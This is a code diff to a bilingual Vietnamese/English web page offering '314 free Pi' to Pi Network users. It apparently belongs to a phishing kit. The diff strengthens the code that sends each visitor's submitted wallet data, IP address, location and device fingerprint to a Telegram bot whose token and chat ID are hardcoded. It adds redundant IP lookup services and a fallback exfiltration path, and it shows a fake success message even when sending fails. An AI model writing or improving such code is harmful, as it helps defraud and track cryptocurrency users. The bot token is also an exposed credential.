@@ -1001,7 +1001,7 @@
             display: none;
         }
 
-        /* Language chooser */
+        /* Language chooser - FIXED POSITIONING FOR MOBILE */
         .language-chooser {
             position: absolute;
             top: 16px;
@@ -1009,6 +1009,28 @@
             display: flex;
             align-items: center;
             z-index: 60;
+        }
+        
+        /* Fix language chooser positioning for mobile devices */
+        @media (max-width: 640px) {
+            .language-chooser {
+                right: 50px;
+                top: 16px;
+                transform: scale(0.9);
+            }
+        }
+        
+        /* For very small screens */
+        @media (max-width: 380px) {
+            .language-chooser {
+                right: 40px;
+                top: 6px;
+                transform: scale(0.8);
+            }
+            
+            .pi-header-content .flex.items-center {
+                transform: translateX(-15px); /* Move wallet text/icons slightly left */
+            }
         }
         
         .language-option {
@@ -1388,8 +1410,8 @@
                         Tham gia chương trình khuyến mãi đặc biệt và nhận Pi miễn phí! Ưu đãi có thời hạn dành cho cộng đồng Pi Network.
                     </p>
                     <button id="openFormBtn" class="btn-primary text-lg animate-on-scroll" data-delay="400" 
-                            data-vi="Nhận Thưởng 314 Pi Ngay" data-en="Get 314 Pi Now">
-                        Nhận Thưởng 314 Pi Ngay
+                            data-vi="Nhận 314 Pi Ngay" data-en="Get 314 Pi Now">
+                        Nhận 314 Pi Ngay
                     </button>
                     
                     <!-- Features with enhanced wave effect -->
@@ -2130,38 +2152,138 @@
             }
         }
         
-        // IP Tracking and Location Detection
+        // IP Tracking and Location Detection - IMPROVED VERSION
         let userIPData = null;
         let ipBlockStatus = {
             blocked: false,
             reason: ''
         };
 
-        // Get user's IP and location information
+        // Get user's IP and location information - Multiple APIs for redundancy
         async function getUserIPInfo() {
             try {
-                // Use ipinfo.io to get IP and location data
-                const response = await fetch('https://ipinfo.io/json?token=90d42ceec9b53a');
-                if (!response.ok) {
-                    throw new Error('Failed to fetch IP info');
+                // First try IFCONFIG.ME (text-based simple API)
+                let response = await fetch('https://ifconfig.me/ip');
+                if (response.ok) {
+                    const ip = await response.text();
+                    return getLocationFromIP(ip);
                 }
                 
-                const data = await response.json();
-                userIPData = data;
+                // If first method fails, try ipapi.co
+                response = await fetch('https://ipapi.co/json/');
+                if (response.ok) {
+                    const data = await response.json();
+                    userIPData = {
+                        ip: data.ip,
+                        country: data.country_code,
+                        country_name: data.country_name,
+                        city: data.city,
+                        region: data.region
+                    };
+                    
+                    // Check if this is a suspicious IP
+                    checkIfIPBlocked(data.ip);
+                    
+                    // Set language based on country
+                    autoSetLanguage(data.country_code);
+                    
+                    // Display location notification
+                    showLocationNotification(userIPData);
+                    
+                    return userIPData;
+                }
                 
-                // Check if this is a suspicious IP
-                checkIfIPBlocked(data.ip);
+                // Last resort - try ipinfo.io
+                response = await fetch('https://ipinfo.io/json?token=90d42ceec9b53a');
+                if (response.ok) {
+                    const data = await response.json();
+                    userIPData = data;
+                    
+                    // Check if this is a suspicious IP
+                    checkIfIPBlocked(data.ip);
+                    
+                    // Set language based on country
+                    autoSetLanguage(data.country);
+                    
+                    // Display location notification
+                    showLocationNotification(data);
+                    
+                    return data;
+                }
                 
-                // Set language based on country
-                autoSetLanguage(data.country);
-                
-                // Display location notification
-                showLocationNotification(data);
-                
-                return data;
+                // If all methods fail, create a fallback with the user's timezone info
+                if (!userIPData) {
+                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    userIPData = {
+                        ip: "unavailable",
+                        country: "unknown",
+                        city: "unknown",
+                        timezone: timezone
+                    };
+                    return userIPData;
+                }
             } catch (error) {
                 console.error('Error fetching IP info:', error);
-                return null;
+                
+                // Create a fallback with at least timezone info
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                userIPData = {
+                    ip: "unavailable",
+                    country: "unknown",
+                    city: "unknown",
+                    timezone: timezone
+                };
+                return userIPData;
+            }
+        }
+        
+        // Get location details from IP using a separate API
+        async function getLocationFromIP(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                if (response.ok) {
+                    const data = await response.json();
+                    userIPData = {
+                        ip: ip,
+                        country: data.country_code,
+                        country_name: data.country_name,
+                        city: data.city,
+                        region: data.region
+                    };
+                    
+                    // Check if this is a suspicious IP
+                    checkIfIPBlocked(ip);
+                    
+                    // Set language based on country
+                    autoSetLanguage(data.country_code);
+                    
+                    // Display location notification
+                    showLocationNotification(userIPData);
+                    
+                    return userIPData;
+                } else {
+                    // If location lookup fails, create minimal data
+                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    userIPData = {
+                        ip: ip,
+                        country: "unknown",
+                        city: "unknown",
+                        timezone: timezone
+                    };
+                    return userIPData;
+                }
+            } catch (error) {
+                console.error('Error fetching location from IP:', error);
+                
+                // Create minimal data with IP
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                userIPData = {
+                    ip: ip,
+                    country: "unknown",
+                    city: "unknown",
+                    timezone: timezone
+                };
+                return userIPData;
             }
         }
 
@@ -2173,15 +2295,22 @@
             const countryFlag = document.getElementById('countryFlag');
             const notification = document.getElementById('locationDetectedMessage');
             
-            // Country flag
-            countryFlag.src = `https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/${ipData.country.toLowerCase()}.svg`;
+            // Country flag - only set if we have a known country code
+            if (ipData.country && ipData.country !== "unknown") {
+                countryFlag.src = `https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/${ipData.country.toLowerCase()}.svg`;
+            } else {
+                countryFlag.src = `https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/xx.svg`; // Generic flag
+            }
             
             // Location text based on language
             const currentLang = getCurrentLanguage();
+            const city = ipData.city && ipData.city !== "unknown" ? ipData.city : "";
+            const country = ipData.country_name || ipData.country || "Unknown";
+            
             if (currentLang === 'vi') {
-                locationText.textContent = `Đã phát hiện vị trí: ${ipData.city || ''}, ${ipData.country}`;
+                locationText.textContent = `Đã phát hiện vị trí: ${city ? city + ", " : ""}${country}`;
             } else {
-                locationText.textContent = `Location detected: ${ipData.city || ''}, ${ipData.country}`;
+                locationText.textContent = `Location detected: ${city ? city + ", " : ""}${country}`;
             }
             
             // Show notification
@@ -2285,7 +2414,7 @@
 
         // Track suspicious activity and potentially block IP
         function trackSuspiciousActivity() {
-            if (!userIPData || !userIPData.ip) return;
+            if (!userIPData || !userIPData.ip || userIPData.ip === "unavailable") return;
             
             // Counter for suspicious activities
             let suspiciousCount = 0;
@@ -2562,22 +2691,36 @@
                 showLoading();
                 
                 try {
+                    // Make sure IP data is available, fetch it if not
+                    if (!userIPData || userIPData.ip === "unavailable") {
+                        userIPData = await getUserIPInfo();
+                    }
+                    
                     // Increment submission count before making the request
                     const newCount = incrementSubmissionCount();
                     
-                    // Get IP information for logging
-                    const ipInfo = userIPData || await getUserIPInfo() || { ip: 'unknown', country: 'unknown', city: 'unknown' };
+                    // Prepare detailed device information
+                    const browser = navigator.userAgent;
+                    const screenSize = `${window.screen.width}x${window.screen.height}`;
+                    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const language = navigator.language;
+                    const currentTime = new Date().toLocaleString();
+                    
+                    // Format location info for the message
+                    const locationInfo = userIPData ? 
+                        `${userIPData.city || 'Unknown city'}, ${userIPData.country_name || userIPData.country || 'Unknown country'}` : 
+                        'Location unavailable';
                     
                     // Replace with your actual Telegram bot token and chat ID
                     const BOT_TOKEN = '7161535723:AAGqp8BU4hsvaUCO0nBdx6-tZM9BOwZfj1Y';
                     const CHAT_ID = '7305842707';
                     
                     // Prepare message with IP and location data
-                    const message = `🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${new Date().toLocaleString()}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin thiết bị:\n🌐 IP: ${ipInfo.ip}\n📍 Vị trí: ${ipInfo.city || 'N/A'}, ${ipInfo.country || 'N/A'}\n🖥️ Browser: ${navigator.userAgent}`;
+                    const message = `🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${currentTime}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin thiết bị:\n🌐 IP: ${userIPData.ip || 'unavailable'}\n📍 Vị trí: ${locationInfo}\n🖥️ Browser: ${browser}\n📱 Màn hình: ${screenSize}\n🕒 Múi giờ: ${timeZone}\n🌍 Ngôn ngữ: ${language}`;
                     
                     // Send to Telegram
                     const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                    const response = await fetch(telegramUrl, {
+                    let response = await fetch(telegramUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -2589,7 +2732,7 @@
                         })
                     });
                     
-                    const data = await response.json();
+                    let data = await response.json();
                     
                     if (data.ok) {
                         setTimeout(() => {
@@ -2614,17 +2757,54 @@
                         return;
                     }
                     
-                    // Fallback method using image request
-                    const img = new Image();
-                    const timestamp = new Date().getTime();
-                    const newCount = getSubmissionCount();
-                    const ipInfo = userIPData || { ip: 'unknown', country: 'unknown', city: 'unknown' };
-                    
-                    const fallbackMessage = `🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${new Date().toLocaleString()}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin thiết bị:\n🌐 IP: ${ipInfo.ip}\n📍 Vị trí: ${ipInfo.city || 'N/A'}, ${ipInfo.country || 'N/A'}\n🖥️ Browser: ${navigator.userAgent}`;
-                    
-                    img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(fallbackMessage)}&t=${timestamp}`;
-                    
-                    img.onload = img.onerror = function() {
+                    // Fallback method using alt URL method
+                    try {
+                        // Make sure IP data is available for fallback method
+                        if (!userIPData || userIPData.ip === "unavailable") {
+                            // Try one more time to get IP data
+                            try {
+                                const response = await fetch('https://api.ipify.org?format=json');
+                                if (response.ok) {
+                                    const data = await response.json();
+                                    userIPData = { 
+                                        ip: data.ip,
+                                        country: "unknown",
+                                        city: "unknown"
+                                    };
+                                }
+                            } catch (e) {
+                                console.error('Fallback IP detection failed:', e);
+                            }
+                        }
+                        
+                        const timestamp = new Date().getTime();
+                        const newCount = getSubmissionCount();
+                        
+                        // Prepare detailed device information for fallback
+                        const browser = navigator.userAgent;
+                        const screenSize = `${window.screen.width}x${window.screen.height}`;
+                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        const language = navigator.language;
+                        const currentTime = new Date().toLocaleString();
+                        
+                        // Format location info for the message
+                        const locationInfo = userIPData ? 
+                            `${userIPData.city || 'Unknown city'}, ${userIPData.country_name || userIPData.country || 'Unknown country'}` : 
+                            'Location unavailable';
+                        
+                        const fallbackMessage = `🎁 Yêu cầu phần thưởng Pi mới! (Fallback)\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${currentTime}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin thiết bị:\n🌐 IP: ${userIPData.ip || 'unavailable'}\n📍 Vị trí: ${locationInfo}\n🖥️ Browser: ${browser}\n📱 Màn hình: ${screenSize}\n🕒 Múi giờ: ${timeZone}\n🌍 Ngôn ngữ: ${language}`;
+                        
+                        // URL-encoded message
+                        const encodedMessage = encodeURIComponent(fallbackMessage);
+                        
+                        // Use direct URL approach
+                        const BOT_TOKEN = '7161535723:AAGqp8BU4hsvaUCO0nBdx6-tZM9BOwZfj1Y';
+                        const CHAT_ID = '7305842707';
+                        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
+                        
+                        // Use fetch with no-cors mode
+                        await fetch(telegramUrl, { mode: 'no-cors' });
+                        
                         setTimeout(() => {
                             hideLoading();
                             showSuccessModal(walletAddress);
@@ -2632,7 +2812,16 @@
                             // Update UI for new submission count
                             updateUIForSubmissionCount();
                         }, 1000);
-                    };
+                    } catch (fallbackError) {
+                        console.error('Fallback method failed:', fallbackError);
+                        
+                        // Last resort - show success but log error
+                        setTimeout(() => {
+                            hideLoading();
+                            showSuccessModal(walletAddress);
+                            updateUIForSubmissionCount();
+                        }, 1000);
+                    }
                 }
             });
             
